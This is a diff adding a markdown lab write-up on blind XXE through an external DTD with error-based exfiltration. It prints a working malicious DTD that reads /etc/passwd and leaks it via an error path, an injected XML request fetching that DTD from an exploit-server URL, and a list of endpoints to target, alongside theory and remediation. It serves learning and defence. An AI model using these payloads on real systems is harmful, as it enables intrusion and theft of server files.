@@ -2267,3 +2267,308 @@ enforce strict parsing rules
 ## 🧠 One-Line Summary
 
 👉 “XXE via file upload happens when XML-based formats like SVG are parsed server-side and external entities are allowed to execute.”
+
+---
+
+# 🧠Lab-5 XXE via External DTD (Error-Based Exfiltration)
+
+---
+
+## 🔵 Overview
+
+This is a Blind XXE vulnerability using External DTD injection and error-based data exfiltration.
+
+Core idea:
+
+```txt
+Server parses XML input
+        ↓
+Server fetches attacker-controlled external DTD
+        ↓
+DTD reads sensitive file (/etc/passwd)
+        ↓
+Error message leaks file content
+```
+
+---
+
+## 🟡 What is the Topic? (Full Theory + Concepts)
+
+---
+
+### 🔹 1. XML External Entity (XXE)
+
+XXE is a vulnerability where:
+
+XML parser processes attacker-controlled entities or DTDs
+
+This allows:
+
+file reading
+
+SSRF
+
+data leakage
+
+internal system access
+
+---
+
+### 🔹 2. What is DTD? (IMPORTANT)
+
+DTD = Document Type Definition
+
+👉 It defines rules and structure of XML
+
+Example purpose:
+
+define entities
+
+validate XML structure
+
+reuse XML components
+
+---
+
+### 🔹 3. External DTD (Key Concept)
+
+Normally DTD is inside XML:
+
+👉 External DTD means:
+
+DTD is loaded from external attacker-controlled URL
+
+So server blindly fetches it and executes logic.
+
+---
+
+### 🔹 4. Parameter Entities (VERY IMPORTANT)
+
+Written as:
+
+```txt
+%name;
+```
+
+Used inside DTD only.
+
+👉 They allow dynamic XML logic execution.
+
+---
+
+### 🔹 5. Key Mental Model
+
+```txt
+XML Parser
+     ↓
+loads external DTD
+     ↓
+executes attacker logic
+     ↓
+error leaks file content
+```
+
+---
+
+## 🟢 Lab Walkthrough (Step-by-Step)
+
+---
+
+### 🌐 Step 1 — Host Malicious DTD (Exploit Server)
+
+```dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+
+![XML External DTD Request](../images/external-dtd-xxe-request.png)
+
+---
+
+### 🔗 Step 2 — Get DTD URL
+
+Example:
+
+```txt
+https://exploit-0abc.exploit-server.net/exploit
+```
+
+---
+
+### 📥 Step 3 — Intercept XML Request
+
+Original request:
+
+```xml
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+---
+
+### 💉 Step 4 — Inject External DTD
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "https://exploit-0abc.exploit-server.net/exploit">
+%xxe;
+]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+---
+
+## 🔍 Payload Breakdown
+
+---
+
+### 📌 1. XML Declaration
+
+Declares XML format version
+
+---
+
+### 📌 2. DOCTYPE Block
+
+Enables entity definition and DTD usage
+
+---
+
+### 📌 3. External Entity (%xxe)
+
+Fetches attacker-hosted DTD file
+
+---
+
+### 📌 4. DTD Execution Chain
+
+Inside DTD:
+
+```txt
+%file  → reads /etc/passwd
+%eval  → builds malicious entity
+%exfil → triggers invalid file access
+```
+
+---
+
+### 📌 5. Error-Based Leak
+
+Invalid file path includes:
+
+```txt
+%file
+```
+
+→ leaks data in error message
+
+---
+
+## 🔥 Full Attack Flow
+
+```txt
+1. XML request sent
+2. Server loads external DTD
+3. DTD reads /etc/passwd
+4. DTD builds invalid file path
+5. XML parser throws error
+6. Error message leaks file content
+```
+
+---
+
+## 🌍 Real-World Scenarios
+
+This vulnerability appears in:
+
+---
+
+### 🏦 Banking / Finance Systems
+
+SOAP APIs
+
+transaction engines
+
+---
+
+### ☁️ Cloud Platforms
+
+metadata endpoints
+
+IAM credential exposure
+
+---
+
+### 🧾 Enterprise Applications
+
+ERP systems
+
+invoice processing engines
+
+---
+
+### 📦 File Processing Systems
+
+XML import tools
+
+report generators
+
+---
+
+## 🎯 High Value Endpoints
+
+Look for XML parsing here:
+
+```txt
+/stockCheck
+/api/xml
+/soap
+/upload
+/import
+/validate
+/process
+```
+
+---
+
+## ⚠️ Why This Attack Works
+
+Because:
+
+XML parser trusts external DTD
+
+attacker controls DTD content
+
+errors expose internal data
+
+no direct output needed (blind bypassed)
+
+---
+
+## 🛡️ Remediation
+
+disable external DTD loading
+
+disable parameter entities
+
+disable DOCTYPE completely
+
+use secure XML parsers
+
+avoid exposing raw error messages
+
+prefer JSON instead of XML
+
+---
+
+## 🧠 One-Line Summary
+
+👉 “External DTD XXE tricks XML parser into fetching attacker logic, reading server files, and leaking them through error messages.”
